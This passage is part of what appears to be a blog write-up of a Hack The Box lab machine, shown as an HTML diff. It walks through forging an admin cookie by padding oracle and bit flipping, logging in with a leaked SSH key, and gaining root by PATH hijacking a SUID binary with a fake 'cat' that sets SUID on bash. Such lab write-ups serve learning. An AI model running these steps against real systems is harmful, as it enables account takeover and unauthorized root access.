+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>190/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 1<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Block <span style="color:#ae81ff">2</span> Results:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> New Cipher Text <span style="color:#f92672">(</span>HEX<span style="color:#f92672">)</span>: 23037825d5a1683b
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Intermediate Bytes <span style="color:#f92672">(</span>HEX<span style="color:#f92672">)</span>: 4a6d7e23d3a76e3d
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>1/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>36/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 7<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>180/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>17/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>146/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>50/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 3<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>132/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>135/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 1<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Block <span style="color:#ae81ff">1</span> Results:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> New Cipher Text <span style="color:#f92672">(</span>HEX<span style="color:#f92672">)</span>: 0408ad19d62eba93
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Intermediate Bytes <span style="color:#f92672">(</span>HEX<span style="color:#f92672">)</span>: 717bc86beb4fdefe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span>** Finished ***
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span></code></pre></div><p>Let&rsquo;s use this cookie and get access as the admin:</p>
+
+  <img src="/img/laz4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<h1 id="second-method-bit-flipper-attack">Second method: Bit Flipper Attack<a href="#second-method-bit-flipper-attack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This attack consists on creating a very similar user to the one we want to hijack, and make subtle changes to the encrypted data until we get to the valid result.</p>
+<p>We can exploit this with Burp. I will create a new user called <strong>bdmin</strong>, intercept a request with Burp and send it to the Intruder:</p>
+
+  <img src="/img/laz5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Now set this configuration:</p>
+<p>
+  <img src="/img/laz6.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+
+  <img src="/img/laz7.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>This way we are setting the Bit Flipper Attack and adding a new column that fetchs for the string that outputs our current user, so when we get to the admin&rsquo;s cookie this will say <strong>admin</strong> instead of <strong>bdmin</strong>.</p>
+<p>Let&rsquo;s execute the attack and see it:</p>
+
+  <img src="/img/laz8.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Eventually we will get to the admin&rsquo;s cookie:
+
+  <img src="/img/laz9.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<h1 id="third-method-admin">Third method: admin=<a href="#third-method-admin" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>For some reason this website is so poorly built that if we register a user <strong>admin=</strong> it will ignore the symbol <em>=</em> and we are going to be logged in as <strong>admin</strong>:</p>
+
+  <img src="/img/laz10.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Once we&rsquo;re logged in as admin we are able to see an <strong>id_rsa</strong>:</p>
+
+  <img src="/img/laz11.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+
+  <img src="/img/laz12.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>In the URL we see the user&rsquo;s name: <strong>mitsos</strong>, so let&rsquo;s connect with SSH.</p>
+<p>Now we can see the <strong>user.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mitsos@LazyClown:~$ ls
+</span></span><span style="display:flex;"><span>backup  cat  peda  user.txt
+</span></span><span style="display:flex;"><span>mitsos@LazyClown:~$ cat user.txt
+</span></span><span style="display:flex;"><span>fee28907eb86bbe*****************
+</span></span></code></pre></div><h1 id="privilege-escalation"><strong><code>Privilege escalation</code></strong><a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="path-hijacking">Path hijacking<a href="#path-hijacking" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We also see a binary <strong>backup</strong> in our directory which has SUID privilege:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mitsos@LazyClown:~$ ls -l backup
+</span></span><span style="display:flex;"><span>-rwsrwsr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">7303</span> May  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2017</span> backup
+</span></span></code></pre></div><p>With <strong>ltrace</strong> we can debug this binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mitsos@LazyClown:~$ ltrace ./backup
+</span></span><span style="display:flex;"><span>__libc_start_main<span style="color:#f92672">(</span>0x804841d, 1, 0xbffffce4, 0x8048440 &lt;unfinished ...&gt;
+</span></span><span style="display:flex;"><span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cat /etc/shadow&#34;</span>cat: /etc/shadow: Permission denied
+</span></span><span style="display:flex;"><span> &lt;no <span style="color:#66d9ef">return</span> ...&gt;
+</span></span><span style="display:flex;"><span>--- SIGCHLD <span style="color:#f92672">(</span>Child exited<span style="color:#f92672">)</span> ---
+</span></span><span style="display:flex;"><span>&lt;... system resumed&gt; <span style="color:#f92672">)</span>                                                                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
+</span></span></code></pre></div><p>It looks like we are just using cat with the <strong>/etc/shadow</strong>, but this is far more interesting for us, the <strong>cat</strong> command is not being called on its absolute path.</p>
+<p>This makes it vulnerable to <strong>path hijacking</strong>, which means that if we create a file <em>cat</em> with a command that changes the <strong>bash</strong> permissions and we also change the PATH it will take our <em>cat</em> instead of the one inside <strong>/bin</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mitsos@LazyClown:/tmp$ echo <span style="color:#e6db74">&#39;chmod u+s /bin/bash&#39;</span> &gt; cat
+</span></span><span style="display:flex;"><span>mitsos@LazyClown:/tmp$ export PATH<span style="color:#f92672">=</span>.:$PATH
+</span></span></code></pre></div><p>As the binary has SUID privilege root will execute this command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mitsos@LazyClown:/tmp$ /home/mitsos/backup
+</span></span><span style="display:flex;"><span>mitsos@LazyClown:/tmp$ ls -l /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">986672</span> Oct  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2014</span> /bin/bash
+</span></span></code></pre></div><p>Now we can launch a bash as root and get the <strong>root.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>mitsos@LazyClown:/tmp$ bash -p
+</span></span><span style="display:flex;"><span>bash-4.3# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>bash-4.3# /bin/cat /root/root.txt
+</span></span><span style="display:flex;"><span>df804ae62d8b1e6*****************
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/haircut/">
+                <span class="button__text">HTB: Haircut</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
